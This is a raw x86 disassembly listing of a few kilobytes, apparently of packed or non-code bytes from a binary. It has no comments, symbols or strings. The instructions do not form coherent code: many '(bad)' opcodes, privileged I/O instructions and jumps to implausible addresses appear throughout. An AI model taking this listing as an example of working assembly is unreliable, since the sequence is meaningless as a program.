  41df9d:	mov    al,ds:0xfa2f89a4
  41dfa2:	mov    al,ch
  41dfa4:	aam    0x4a
  41dfa6:	iret   
  41dfa7:	clc    
  41dfa8:	xor    al,0xb0
  41dfaa:	dec    cl
  41dfac:	jmp    0x41dfb6
  41dfae:	cmp    edx,DWORD PTR [ebp-0x567bad84]
  41dfb4:	xchg   ebx,eax
  41dfb5:	fs inc ebx
  41dfb7:	push   eax
  41dfb8:	stc    
  41dfb9:	pop    esi
  41dfba:	xchg   esp,eax
  41dfbb:	dec    edx
  41dfbc:	jl     0x41dfee
  41dfbe:	add    edx,DWORD PTR [ebx]
  41dfc0:	cs test eax,0x89fa40e1
  41dfc6:	or     BYTE PTR [ecx],ah
  41dfc8:	mov    ebp,DWORD PTR [edi+0x34]
  41dfcb:	outs   dx,BYTE PTR ds:[esi]
  41dfcc:	shl    DWORD PTR ds:0xc175723c,cl
  41dfd2:	add    DWORD PTR [esi+0x1f0baaab],ebp
  41dfd8:	fadd   DWORD PTR fs:[eax-0x5e]
  41dfdc:	jne    0x41e000
  41dfde:	(bad)  
  41dfdf:	out    0x77,eax
  41dfe1:	pop    ss
  41dfe2:	mov    ch,0xe4
  41dfe4:	test   al,0xf0
  41dfe6:	xchg   esi,eax
  41dfe7:	or     BYTE PTR [ebx+ebp*1-0x275d83dc],0x28
  41dfef:	in     al,dx
  41dff0:	add    BYTE PTR [ebp+0x7d],al
  41dff3:	push   edi
  41dff4:	or     al,0x85
  41dff6:	push   ds
  41dff7:	sbb    ebx,edi
  41dff9:	sbb    ch,BYTE PTR [eax]
  41dffb:	retf   0xb6d6
  41dffe:	add    ecx,edx
  41e000:	push   0xfffffff7
  41e002:	call   0xf0c3aaaa
  41e007:	and    eax,0x9c0cc3c6
  41e00c:	out    0x80,al
  41e00e:	clc    
  41e00f:	mov    dh,0x3b
  41e011:	xlat   BYTE PTR ds:[ebx]
  41e012:	ret    
  41e013:	test   DWORD PTR [ecx-0x30f39bc],ebx
  41e019:	fisubr DWORD PTR [edx-0x6f]
  41e01c:	and    ah,BYTE PTR [edi+0x2a]
  41e01f:	mov    ch,0x62
  41e021:	mov    ah,ah
  41e023:	xor    esp,edi
  41e025:	jp     0x41dfe1
  41e027:	jmp    0x41e06d
  41e029:	cdq    
  41e02a:	jae    0x41dfdc
  41e02c:	outs   dx,BYTE PTR ds:[esi]
  41e02d:	sub    al,0x37
  41e02f:	mov    ebp,0xa0dbea07
  41e034:	mov    cl,0x5a
  41e036:	bound  esi,QWORD PTR [edx]
  41e038:	sbb    DWORD PTR [edi+0x14f2c94],edi
  41e03e:	inc    eax
  41e03f:	pop    eax
  41e040:	jecxz  0x41dff5
  41e042:	dec    ebx
  41e043:	loop   0x41e04b
  41e045:	outs   dx,DWORD PTR ds:[esi]
  41e046:	mov    bl,0x15
  41e048:	retf   
  41e049:	jmp    0x41e08d
  41e04b:	cmp    eax,0x5c9fb04d
  41e050:	jns    0x41e0a8
  41e052:	hlt    
  41e053:	pop    si
  41e055:	std    
  41e056:	dec    ebp
  41e057:	in     eax,0x7a
  41e059:	test   DWORD PTR [esi-0x27],eax
  41e05c:	push   ss
  41e05d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41e05f:	jno    0x41e039
  41e061:	or     ecx,DWORD PTR ds:0x31042d68
  41e067:	jmp    0xfceb6c28
  41e06c:	ins    BYTE PTR es:[edi],dx
  41e06d:	mov    WORD PTR [edi-0x64],ds
  41e070:	fnstenv [edx+0x4b1ccd3c]
  41e076:	jl     0x41e044
  41e078:	ret    
  41e079:	(bad)  
  41e07a:	out    dx,eax
  41e07b:	inc    esp
  41e07c:	fmul   QWORD PTR [esp+ebp*1-0x78f7f8b9]
  41e083:	mov    ecx,0x13963078
  41e088:	or     ecx,DWORD PTR [esp+ebp*2+0x775a2a18]
  41e08f:	jl     0x41e0fe
  41e091:	mov    ecx,ds
  41e093:	jmp    0xfb77:0x1588429e
  41e09a:	cmp    bl,BYTE PTR [eax+0x24f53a73]
  41e0a0:	pop    ecx
  41e0a1:	cmp    al,0x27
  41e0a3:	(bad)  
  41e0a4:	push   edi
  41e0a5:	mov    es,WORD PTR [ecx]
  41e0a7:	or     DWORD PTR [ebx+edi*2+0x3c],esi
  41e0ab:	mov    esp,0x648ce648
  41e0b0:	cmp    BYTE PTR [esp+eax*8-0x772aa945],bh
  41e0b7:	jmp    0xe371c4cb
  41e0bc:	mov    ebx,0x6823bf64
  41e0c1:	mov    ebx,0x5e9fe83a
  41e0c6:	inc    edi
  41e0c7:	je     0x41e122
  41e0c9:	mov    esp,0x4006ea2d
  41e0ce:	add    esp,DWORD PTR [edi]
  41e0d0:	sahf   
  41e0d1:	loopne 0x41e05a
  41e0d3:	cmp    al,0xb4
  41e0d5:	mov    ah,0x51
  41e0d7:	mov    DWORD PTR [esi+eax*4-0x1b90a1e7],esp
  41e0de:	call   DWORD PTR [eax-0x1e]
  41e0e1:	sbb    DWORD PTR [ebp+0x14abb6aa],edx
  41e0e7:	out    dx,al
  41e0e8:	retf   0x2635
  41e0eb:	cwde   
  41e0ec:	jecxz  0x41e0c3
  41e0ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0ef:	arpl   cx,sp
  41e0f1:	call   FWORD PTR [esi]
  41e0f3:	aaa    
  41e0f4:	push   edi
  41e0f5:	sbb    al,0xf2
  41e0f7:	fsub   QWORD PTR [edi-0x6]
  41e0fa:	pop    ebp
  41e0fb:	sbb    ecx,DWORD PTR [eax-0x4d]
  41e0fe:	(bad)  
  41e0ff:	retf   0xd163
  41e102:	mov    eax,ds:0xce45fc4d
  41e107:	mov    ds:0x3be37b5d,al
  41e10c:	mov    esi,0x4b471c9d
  41e111:	xor    edx,DWORD PTR [eax+0x62a210f8]
  41e117:	mov    al,0xbc
  41e119:	pop    esp
  41e11a:	and    eax,ebp
  41e11c:	jne    0x41e0c6
  41e11e:	call   0x8641b520
  41e123:	stos   DWORD PTR es:[edi],eax
  41e124:	retf   0xdb6f
  41e127:	inc    esp
  41e128:	out    dx,al
  41e129:	xlat   BYTE PTR cs:[ebx]
  41e12b:	push   eax
  41e12c:	and    al,0x50
  41e12e:	ins    DWORD PTR es:[edi],dx
  41e12f:	cmp    eax,0x6531c70a
  41e134:	or     edx,ebp
  41e136:	push   esp
  41e137:	mov    esp,0x97e092f6
  41e13c:	sar    DWORD PTR [esi-0x63],1
  41e13f:	xchg   esi,eax
  41e140:	mov    ecx,0x36447fa4
  41e145:	retf   
  41e146:	lods   al,BYTE PTR ds:[esi]
  41e147:	test   esp,esi
  41e149:	iret   
  41e14a:	xchg   dl,dl
  41e14c:	cmp    eax,0x17f2329b
  41e151:	ficomp WORD PTR [esi+0xff908e2]
  41e157:	cld    
  41e158:	mov    eax,0x8f2f502e
  41e15d:	shl    DWORD PTR [edx-0xf],cl
  41e160:	xchg   WORD PTR [eax],di
  41e163:	xchg   ecx,eax
  41e164:	xchg   edi,eax
  41e165:	mov    edi,0x1ec0c95
  41e16a:	test   al,0x7e
  41e16c:	pop    eax
  41e16d:	lods   eax,DWORD PTR ds:[esi]
  41e16e:	out    0x67,eax
  41e170:	adc    BYTE PTR ds:0x752382,cl
  41e176:	je     0x41e10d
  41e178:	lea    ebp,[eax+0x34e9c166]
  41e17e:	jmp    0x41e108
  41e180:	enter  0x4e7a,0x1a
  41e184:	je     0x41e1e1
  41e186:	(bad)  
  41e187:	adc    ch,bh
  41e189:	repnz cmp BYTE PTR [edx-0x6cb2f4ba],ch
  41e190:	jne    0x41e1be
  41e192:	shl    cl,1
  41e194:	iret   
  41e195:	add    eax,0x651c41ea
  41e19a:	fld    DWORD PTR [esi+0x2be8fd68]
  41e1a0:	fadd   st(1),st
  41e1a2:	add    ebx,DWORD PTR [edi+ebx*2-0x64]
  41e1a6:	cmp    eax,0x8c55cf0a
  41e1ab:	mov    edx,0x4bdf927f
  41e1b0:	cmc    
  41e1b1:	push   0x32c5706e
  41e1b6:	xchg   BYTE PTR [edx],ah
  41e1b8:	(bad)  
  41e1b9:	mov    eax,ds:0x72d17e95
  41e1be:	sti    
  41e1bf:	jle    0x41e144
  41e1c1:	js     0x41e1eb
  41e1c3:	dec    ebp
  41e1c4:	lahf   
  41e1c5:	lds    eax,FWORD PTR [esp+ebp*2]
  41e1c8:	fdivp  st(4),st
  41e1ca:	mov    DWORD PTR [edx],esp
  41e1cc:	daa    
  41e1cd:	inc    eax
  41e1ce:	bound  edx,QWORD PTR [edx-0x9610ed2]
  41e1d4:	fucom  st(1)
  41e1d6:	dec    ecx
  41e1d7:	or     BYTE PTR [ecx],ah
  41e1d9:	div    DWORD PTR [ecx]
  41e1db:	push   ecx
  41e1dc:	in     al,0x14
  41e1de:	inc    esp
  41e1df:	ret    0xd628
  41e1e2:	dec    edx
  41e1e3:	xchg   BYTE PTR [ebp-0xc38380c],dh
  41e1e9:	fs aad 0xe8
  41e1ec:	push   ebp
  41e1ed:	call   FWORD PTR [ebx+ecx*4-0x61]
  41e1f1:	mov    al,ds:0xf5500303
  41e1f6:	pop    es
  41e1f7:	sbb    ebp,DWORD PTR [edx-0x6ee7a34]
  41e1fd:	jb     0x41e277
  41e1ff:	mov    ?,WORD PTR [ebp+0x42]
  41e202:	xor    eax,0xab8d076e
  41e207:	mov    edx,0xfd04ae0b
  41e20c:	dec    eax
  41e20d:	sub    eax,0x340768a0
  41e212:	mov    esp,0x2a16aea5
  41e217:	fisttp DWORD PTR [ecx-0x33]
  41e21a:	test   eax,0x3b735826
  41e21f:	addr16 mov edx,0xf588c9f
  41e225:	mov    bh,BYTE PTR [edx+0x3f3911bb]
  41e22b:	jg     0x41e232
  41e22d:	js     0x41e22f
  41e22f:	cmc    
  41e230:	add    al,0xe3
  41e232:	lds    ebp,FWORD PTR [eax+0x122d98de]
  41e238:	outs   dx,BYTE PTR ds:[esi]
  41e239:	repz cmp bh,BYTE PTR [esi]
  41e23c:	cmp    ecx,eax
  41e23e:	adc    al,0xb
  41e240:	popf   
  41e241:	outs   dx,DWORD PTR ds:[esi]
  41e242:	pusha  
  41e243:	pop    es
  41e244:	pop    ebp
  41e245:	pop    ebp
  41e246:	xchg   DWORD PTR [esi+ebx*1+0x1a83e4d6],edx
  41e24d:	(bad)  
  41e24e:	(bad)  
  41e24f:	dec    DWORD PTR [edi]
  41e251:	(bad)  
  41e252:	je     0x41e203
  41e254:	jmp    0xa678ec2f
  41e259:	or     ah,BYTE PTR [edx+esi*4]
  41e25c:	pop    edi
  41e25d:	scas   al,BYTE PTR es:[edi]
  41e25e:	je     0x41e2ae
  41e260:	lods   al,BYTE PTR ds:[esi]
  41e261:	mov    eax,ds:0xc2bd07bf
  41e266:	add    dl,bh
  41e268:	pop    ss
  41e269:	pop    esp
  41e26a:	out    dx,al
  41e26b:	xchg   ecx,eax
  41e26c:	retf   0xd1fa
  41e26f:	out    dx,eax
  41e270:	and    ebp,edi
  41e272:	xchg   ebx,eax
  41e273:	pop    edx
  41e274:	inc    esp
  41e275:	cmp    BYTE PTR [ebx+ebp*4],0x61
  41e279:	scas   eax,DWORD PTR es:[edi]
  41e27a:	sbb    DWORD PTR [esi+0x68307341],ebx
  41e280:	jae    0x41e294
  41e282:	jno    0x41e23e
  41e284:	jno    0x41e2f4
  41e286:	call   0x511ee0d
  41e28b:	sub    dh,BYTE PTR [ecx-0x82c858e]
  41e291:	mov    dh,0xf5
  41e293:	ss inc edi
  41e295:	ror    DWORD PTR [ebx-0x6a],1
  41e298:	pop    ecx
  41e299:	or     BYTE PTR [eax+0x2a0f20c3],bl
  41e29f:	adc    esi,edi
  41e2a1:	pop    ecx
  41e2a2:	mov    ah,0xe2
  41e2a4:	retf   0x1ca6
  41e2a7:	mov    bl,0xbb
  41e2a9:	xchg   edx,eax
  41e2aa:	xchg   ebp,eax
  41e2ab:	xchg   DWORD PTR [esi],esi
  41e2ad:	and    dh,BYTE PTR [ebp+ebx*4+0x56e41832]
  41e2b4:	and    DWORD PTR [edx+0x57],edx
  41e2b7:	inc    esi
  41e2b8:	jle    0x41e29b
  41e2ba:	add    esp,DWORD PTR [ebx+0x2584242a]
  41e2c0:	add    ebx,DWORD PTR [esi+0x7f8016cf]
  41e2c6:	(bad)  
  41e2c7:	mov    eax,0xf4f5c34c
  41e2cc:	push   0x374c32ce
  41e2d1:	dec    eax
  41e2d2:	int    0xf4
  41e2d4:	mov    ebp,0x2f680b02
  41e2d9:	xor    eax,0x771601fe
  41e2de:	imul   esi,DWORD PTR [eax-0x16e8b612],0x61
  41e2e5:	call   0x1b2d:0xac95c125
  41e2ec:	adc    edi,esp
  41e2ee:	adc    ch,BYTE PTR [edi-0x32a6b06b]
  41e2f4:	rol    dh,1
  41e2f6:	push   edx
  41e2f7:	pop    ss
  41e2f8:	push   0xfffffff9
  41e2fa:	(bad)  
  41e2fb:	dec    edx
  41e2fc:	sti    
  41e2fd:	cdq    
  41e2fe:	retf   
  41e2ff:	dec    eax
  41e300:	js     0x41e376
  41e302:	dec    esi
  41e303:	jle    0x41e2ee
  41e305:	test   BYTE PTR [ecx-0x6b4717ed],0xad
  41e30c:	sbb    ah,BYTE PTR [edx+0x76]
  41e30f:	mov    ds:0x74ab3ef2,al
  41e314:	push   0x8de1c5d1
  41e319:	adc    al,0x8
  41e31b:	mov    dh,0x89
  41e31d:	enter  0x65eb,0xe7
  41e321:	mov    ecx,0xf4f7eabd
  41e326:	sbb    BYTE PTR [ebp-0x52],bl
  41e329:	dec    edi
  41e32a:	pop    es
  41e32b:	and    cl,BYTE PTR [ebx+0x13]
  41e32e:	scas   al,BYTE PTR es:[edi]
  41e32f:	pop    edi
  41e330:	into   
  41e331:	pop    ecx
  41e332:	pusha  
  41e333:	cli    
  41e334:	das    
  41e335:	popa   
  41e336:	xchg   esi,eax
  41e337:	sar    DWORD PTR [edi-0x7dd3b7e0],0xda
  41e33e:	fild   QWORD PTR [ecx]
  41e340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e341:	in     eax,dx
  41e342:	call   0x9f8d:0x3d634f39
  41e349:	mov    bl,0x6a
  41e34b:	add    eax,0x56f5595e
  41e350:	push   edi
  41e351:	rcl    DWORD PTR [edi],0x2d
  41e354:	std    
  41e355:	inc    ecx
  41e356:	ss mov edi,0x2d618dc7
  41e35c:	repnz and esp,esi
  41e35f:	nop
  41e360:	jl     0x41e34e
  41e362:	ret    
  41e363:	inc    edx
  41e364:	sub    al,0xa7
  41e366:	add    DWORD PTR ds:0x1fc3fafb,esp
  41e36c:	aaa    
  41e36d:	push   ebx
  41e36e:	cwde   
  41e36f:	push   ss
  41e370:	aam    0xcd
  41e372:	xchg   edx,eax
  41e373:	in     eax,0x3e
  41e375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e376:	pushf  
  41e377:	push   ds
  41e378:	sbb    BYTE PTR [esi-0x65],bl
  41e37b:	mov    ebp,0xc84a3e42
  41e380:	add    DWORD PTR [eax-0x3d93e88],ebp
  41e386:	repnz mov ah,0x4c
  41e389:	mov    ebx,0xe50ea7b5
  41e38e:	mov    esi,ecx
  41e390:	xlat   BYTE PTR ds:[ebx]
  41e391:	(bad)  [ebx-0x5d]
  41e394:	test   BYTE PTR ds:0x43da2b96,bh
  41e39a:	retf   
  41e39b:	xor    al,0xe9
  41e39e:	mov    al,ds:0x6d8de2cb
  41e3a3:	xor    dl,BYTE PTR [edx+0x220ff26d]
  41e3a9:	adc    BYTE PTR [ecx+0x717f840b],bh
  41e3af:	rol    DWORD PTR [eax],0xd0
  41e3b2:	out    dx,eax
  41e3b3:	adc    ebx,eax
  41e3b5:	pushf  
  41e3b6:	pop    ss
  41e3b7:	push   eax
  41e3b8:	daa    
  41e3b9:	lods   eax,DWORD PTR ds:[esi]
  41e3ba:	pop    ds
  41e3bb:	mov    bh,0xe0
  41e3bd:	sub    eax,0x9a03d5fa
  41e3c2:	cld    
  41e3c3:	push   edx
  41e3c4:	(bad)  
  41e3c5:	scas   eax,DWORD PTR es:[edi]
  41e3c6:	out    0xa0,eax
  41e3c8:	sti    
  41e3c9:	mov    dl,0xff
  41e3cb:	pushf  
  41e3cc:	pop    ebp
  41e3cd:	jbe    0x41e41d
  41e3cf:	aaa    
  41e3d0:	cmp    BYTE PTR [edx],0x18
  41e3d3:	pop    edi
  41e3d4:	shl    dl,cl
  41e3d6:	ret    0xaa75
  41e3d9:	mul    BYTE PTR [ecx]
  41e3db:	dec    ecx
  41e3dc:	aam    0x64
  41e3de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3df:	dec    esi
  41e3e0:	and    ebp,DWORD PTR [edi]
  41e3e2:	lea    esp,[edi]
  41e3e4:	cmp    ebp,DWORD PTR [esi-0x3aec99d]
  41e3ea:	ds dec esi
  41e3ec:	add    BYTE PTR [eax],ch
  41e3ee:	mov    eax,DWORD PTR [ebx+0x7b]
  41e3f1:	loope  0x41e46f
  41e3f3:	mov    bh,0xbb
  41e3f5:	and    ah,BYTE PTR [ebx+edx*2]
  41e3f8:	sub    eax,0xa2e2345a
  41e3fd:	jmp    0xd3e9:0xa3d7699a
  41e404:	in     eax,0x21
  41e406:	inc    edx
  41e407:	or     eax,0xa2e39571
  41e40c:	mov    WORD PTR [ecx-0x4b],cs
  41e40f:	add    al,0x7b
  41e411:	nop
  41e412:	outs   dx,BYTE PTR ds:[esi]
  41e413:	mov    esi,0x61f76a16
  41e418:	or     al,0x9f
  41e41a:	pop    edx
  41e41b:	xchg   edi,eax
  41e41c:	loope  0x41e43b
  41e41e:	(bad)  
  41e41f:	outs   dx,DWORD PTR fs:[esi]
  41e421:	imul   esi,DWORD PTR [eax+0x62b3a947],0xb49dc95f
  41e42b:	aam    0xaa
  41e42d:	stos   BYTE PTR es:[edi],al
  41e42e:	inc    eax
  41e42f:	add    esp,ebp
  41e431:	push   0xffffffbd
  41e433:	add    al,0xc9
  41e435:	sbb    DWORD PTR [esi+eax*1-0x57a6a8a1],ecx
  41e43c:	mov    esp,0x606abd62
  41e441:	adc    al,0x87
  41e443:	cmp    BYTE PTR ds:0xa004ca04,ch
  41e449:	or     ah,BYTE PTR [ecx+0x4ca37dfd]
  41e44f:	ds js  0x41e3e8
  41e452:	call   0x9be8:0xac6be684
  41e459:	sub    al,0xfe
  41e45b:	pop    ds
  41e45c:	out    dx,eax
  41e45d:	xor    bl,BYTE PTR [edi+0x117a93ef]
  41e463:	mov    bl,0xf6
  41e465:	jo     0x41e42a
  41e467:	call   0x7d81073b
  41e46c:	dec    esp
  41e46d:	dec    esi
  41e46e:	sbb    eax,0x36b67035
  41e473:	jp     0x41e46a
  41e475:	or     al,0x32
  41e477:	retf   0x8d3a
  41e47a:	pop    esp
  41e47b:	xlat   BYTE PTR ds:[ebx]
  41e47c:	scas   eax,DWORD PTR es:[edi]
  41e47d:	shl    DWORD PTR [esi+0x7a549f05],1
  41e483:	sub    eax,0x70b2c455
  41e488:	add    bh,bl
  41e48a:	call   0x6fac28ac
  41e48f:	outs   dx,BYTE PTR ds:[esi]
  41e490:	push   eax
  41e491:	push   ss
  41e492:	dec    esp
  41e493:	pop    esi
  41e494:	fmul   QWORD PTR [edx+edi*8-0x64]
  41e498:	pop    ebx
  41e499:	cli    
  41e49a:	neg    DWORD PTR ds:0xc55da716
  41e4a0:	mov    al,0x8d
  41e4a2:	xor    ecx,DWORD PTR [ebp*2+0x2cbf1b63]
  41e4a9:	pop    ebp
  41e4aa:	addr16 add dh,ch
  41e4ad:	fucomi st,st(5)
  41e4af:	lock adc al,0x3e
  41e4b2:	dec    esi
  41e4b3:	or     eax,0xfc32a248
  41e4b8:	mov    ebp,0x7c10e60f
  41e4bd:	cli    
  41e4be:	gs pop eax
  41e4c0:	(bad)  
  41e4c1:	scas   eax,DWORD PTR es:[edi]
  41e4c2:	jmp    0x41e46c
  41e4c4:	mov    ds:0xe7de1839,eax
  41e4c9:	jp     0x41e504
  41e4cb:	rcl    DWORD PTR [esi+eiz*1+0x41b98407],0xcb
  41e4d3:	pushf  
  41e4d4:	cmp    al,0x45
  41e4d6:	pusha  
  41e4d7:	and    al,0x1d
  41e4d9:	das    
  41e4da:	xchg   ecx,eax
  41e4db:	inc    edx
  41e4dc:	xlat   BYTE PTR ds:[ebx]
  41e4dd:	push   ecx
  41e4de:	inc    ebx
  41e4df:	mov    ebp,0x7a194a6b
  41e4e4:	mov    ah,BYTE PTR [ebp+0x6]
  41e4e7:	out    dx,eax
  41e4e8:	bound  ebx,QWORD PTR [ebx-0x57e8cf55]
  41e4ee:	mov    esp,0x655373d8
  41e4f3:	outs   dx,DWORD PTR ds:[esi]
  41e4f4:	(bad)  
  41e4f5:	fsubr  QWORD PTR [edx-0x1d5296c2]
  41e4fb:	inc    eax
  41e4fc:	xchg   esp,eax
  41e4fd:	pop    esi
  41e4fe:	fnstenv [eax-0x6340f569]
  41e504:	mov    bl,0x23
  41e506:	mov    ds:0x91fc4a09,al
  41e50b:	sbb    ch,BYTE PTR [edx-0x1118c152]
  41e511:	mov    edx,0x412f3601
  41e516:	ss js  0x41e49c
  41e519:	adc    al,0xd
  41e51b:	push   edx
  41e51c:	sub    BYTE PTR [ebp+0x7051e8c7],cl
  41e522:	sbb    esp,ecx
  41e524:	sub    al,0x4a
  41e526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e527:	std    
  41e528:	mov    ds:0x66ca75d7,al
  41e52d:	mov    ebx,0xb9d4ecab
  41e532:	push   0x63e5a191
  41e537:	das    
  41e538:	pusha  
  41e539:	adc    edi,edx
  41e53b:	mov    bl,0xa3
  41e53d:	retf   
  41e53e:	mov    ebx,0x50361c8d
  41e543:	inc    esp
  41e544:	jb     0x41e4db
  41e546:	mov    ch,0x91
  41e548:	inc    edi
  41e549:	loopne 0x41e581
  41e54b:	cmp    ah,BYTE PTR [esi]
  41e54d:	mov    ebx,0xf618696d
  41e552:	iret   
  41e553:	mov    ebx,0xd4a4cdab
  41e558:	push   ds
  41e559:	cdq    
  41e55a:	sbb    ah,BYTE PTR [eax]
  41e55c:	dec    edx
  41e55d:	mov    bh,0xf3
  41e55f:	arpl   WORD PTR [ebp+ebx*4-0x45c78dc2],dx
  41e566:	add    ah,bl
  41e568:	xor    al,0xb
  41e56a:	int    0x32
  41e56c:	add    BYTE PTR [edx+0x7c],ah
  41e56f:	mov    dl,0x92
  41e571:	pop    ebx
  41e572:	enter  0xe105,0xd9
  41e576:	repnz test eax,0x41cdbfe4
  41e57c:	ins    BYTE PTR es:[edi],dx
  41e57d:	mov    bl,0xc0
  41e57f:	icebp  
  41e580:	jno    0x41e536
  41e582:	xchg   esp,eax
  41e583:	jl     0x41e5a4
  41e585:	fsub   QWORD PTR [ebx-0x2ff1382f]
  41e58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e58c:	lea    ebx,[ecx-0x50]
  41e58f:	push   ebx
  41e590:	xchg   ebx,eax
  41e591:	pop    DWORD PTR [ebp+ebx*1+0x9]
  41e595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e596:	nop
  41e597:	shr    DWORD PTR ss:[ebp+0x63],cl
  41e59b:	cmp    dl,BYTE PTR [esi]
  41e59d:	loopne 0x41e579
  41e59f:	pop    esp
  41e5a0:	arpl   dx,di
  41e5a2:	inc    ecx
  41e5a3:	test   al,0x9
  41e5a5:	pop    ebx
  41e5a6:	call   0x4fc9:0xc572b7d1
  41e5ad:	iret   
  41e5ae:	sti    
  41e5af:	imul   esi,DWORD PTR [edx-0xf],0x4d
  41e5b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5b4:	pop    ss
  41e5b5:	push   0x5a8eec53
  41e5ba:	clc    
  41e5bb:	test   al,0xf0
  41e5bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5be:	jecxz  0x41e62e
  41e5c0:	mov    dh,0xf9
  41e5c2:	push   esp
  41e5c3:	jge    0x41e618
  41e5c5:	adc    al,BYTE PTR [eax]
  41e5c7:	leave  
  41e5c8:	or     eax,0x81c66cda
  41e5cd:	fld    st(3)
  41e5cf:	sbb    ch,ah
  41e5d1:	sbb    DWORD PTR [eax+0x28],esp
  41e5d4:	adc    ecx,DWORD PTR [edx+0x5efe08c4]
  41e5da:	lahf   
  41e5db:	cli    
  41e5dc:	pushf  
  41e5dd:	push   0xffffff8c
  41e5df:	or     DWORD PTR [edx],ebp
  41e5e1:	pop    esp
  41e5e2:	cmp    ecx,edi
  41e5e4:	mov    al,0xd8
  41e5e6:	out    dx,eax
  41e5e7:	and    eax,0xe929c88b
  41e5ec:	mov    edi,0x7f007719
  41e5f1:	sbb    ch,ah
  41e5f3:	fsub   QWORD PTR [esi+0x106fcf19]
  41e5f9:	popf   
  41e5fa:	out    dx,al
  41e5fb:	loopne 0x41e600
  41e5fd:	addr16 xchg ecx,eax
  41e5ff:	add    eax,0x50e18b25
  41e604:	gs mov ebp,0x609e5d3
  41e60a:	push   0xffffff97
  41e60c:	adc    eax,0x2798e46c
  41e611:	call   0x350d7e43
  41e616:	les    edx,FWORD PTR [eax+0x3f8af36e]
  41e61c:	add    DWORD PTR [ecx-0x7c275c0],eax
  41e622:	add    esp,DWORD PTR [ecx-0x7dcb57e6]
  41e628:	mov    ds:0x4434f679,eax
  41e62d:	sar    BYTE PTR [ecx+0x155d8d6f],0xf1
  41e634:	ret    
  41e635:	mov    al,ds:0x54bb6727
  41e63a:	mov    ebp,DWORD PTR [esi+0x1a]
  41e63d:	daa    
  41e63e:	fstp   TBYTE PTR [edx-0xb]
  41e641:	es stc 
  41e643:	sbb    ah,ah
  41e645:	push   0xffffff82
  41e647:	add    al,0xa3
  41e649:	ins    BYTE PTR es:[edi],dx
  41e64a:	push   0xb480785c
  41e64f:	dec    esi
  41e650:	mov    BYTE PTR [ebx],ah
  41e652:	sub    edx,DWORD PTR [edi]
  41e654:	test   BYTE PTR [edi+0x743a36c7],ch
  41e65a:	mov    ds:0x21017d0a,al
  41e660:	jg     0x41e66f
  41e662:	(bad)  
  41e663:	scas   al,BYTE PTR es:[edi]
  41e664:	sbb    BYTE PTR [edi+0x37fdcb6a],al
  41e66a:	and    al,dh
  41e66c:	mov    eax,ds:0xb23cc19e
  41e671:	or     DWORD PTR [eax-0x69],0xffffff84
  41e675:	xlat   BYTE PTR ds:[ebx]
  41e676:	xchg   edi,eax
  41e677:	mov    DWORD PTR [ebp+0x18],ebx
  41e67a:	cmp    DWORD PTR [ebp-0x3b],0xb5036c1d
  41e681:	dec    edx
  41e682:	jmp    0xfd148414
  41e687:	cmp    ah,BYTE PTR ds:0x3678f817
  41e68d:	cmp    al,0x64
  41e68f:	mov    esp,ecx
  41e691:	cli    
  41e692:	scas   eax,DWORD PTR es:[edi]
  41e693:	push   ecx
  41e694:	leave  
  41e695:	popf   
  41e696:	adc    al,0x3b
  41e698:	dec    esi
  41e699:	cwde   
  41e69a:	mov    cs,esi
  41e69c:	addr16 xchg ecx,eax
  41e69e:	daa    
  41e69f:	dec    ecx
  41e6a0:	jbe    0x41e642
  41e6a2:	gs pusha 
  41e6a4:	or     DWORD PTR [ecx+0x749d5c5f],ebx
  41e6aa:	dec    esi
  41e6ab:	imul   edi,eax,0xfffffffb
  41e6ae:	lods   eax,DWORD PTR ds:[esi]
  41e6af:	mov    WORD PTR [ebx+0x53aaec3c],?
  41e6b5:	int3   
  41e6b6:	scas   al,BYTE PTR es:[edi]
  41e6b7:	pop    edi
  41e6b8:	mov    al,0x4c
  41e6ba:	cs pop esi
  41e6bc:	xor    BYTE PTR [ebp+0x2],dl
  41e6bf:	call   0xaa5a:0x3b437f3
  41e6c6:	or     eax,0xa0536b11
  41e6cb:	push   eax
  41e6cc:	add    esi,DWORD PTR ss:[edi+0x33]
  41e6d0:	outs   dx,DWORD PTR ds:[esi]
  41e6d1:	retf   0xc8
  41e6d4:	in     eax,0x6b
  41e6d6:	and    DWORD PTR [ecx],edx
  41e6d8:	fld    QWORD PTR [ecx+0x2e]
  41e6db:	retf   0x69c3
  41e6de:	(bad)  
  41e6e0:	scas   eax,DWORD PTR es:[edi]
  41e6e1:	fs xor eax,0x9dd59f85
  41e6e7:	and    eax,0x61c6e7a8
  41e6ec:	add    al,0xfe
  41e6ee:	stc    
  41e6ef:	inc    edi
  41e6f0:	jecxz  0x41e731
  41e6f2:	mov    ss,WORD PTR [esi+0x39817ce]
  41e6f8:	popa   
  41e6f9:	aas    
  41e6fa:	dec    esi
  41e6fb:	pop    eax
  41e6fc:	jmp    0x39c92c9b
  41e701:	mov    bl,0xf7
  41e703:	sbb    DWORD PTR [ecx-0x1aa9ffe2],ecx
  41e709:	pusha  
  41e70a:	sub    dl,BYTE PTR [edi+esi*8-0x3b466eaf]
  41e711:	std    
  41e712:	adc    BYTE PTR [ebx+0x14],dl
  41e715:	into   
  41e716:	pop    ds
  41e717:	loop   0x41e710
  41e719:	sbb    edi,ecx
  41e71b:	mov    DWORD PTR [edi+0x58],ebp
  41e71e:	sub    ah,BYTE PTR [ebx]
  41e720:	jecxz  0x41e780
  41e722:	retf   
  41e723:	shl    BYTE PTR [esi+edx*2+0x15ffe966],cl
  41e72a:	cli    
  41e72b:	mov    bl,0x9f
  41e72d:	cmp    dl,BYTE PTR [esi]
  41e72f:	gs mov edi,esp
  41e732:	fistp  DWORD PTR [ebp-0x17]
  41e735:	dec    ebx
  41e736:	dec    edx
  41e737:	or     bh,BYTE PTR [edi]
  41e739:	or     bh,BYTE PTR [eax]
  41e73b:	xchg   esp,eax
  41e73c:	mov    cl,0xf8
  41e73e:	lds    edi,FWORD PTR [ebx-0x797303ee]
  41e744:	test   ch,dl
  41e746:	mov    ecx,esi
  41e748:	jle    0x41e75c
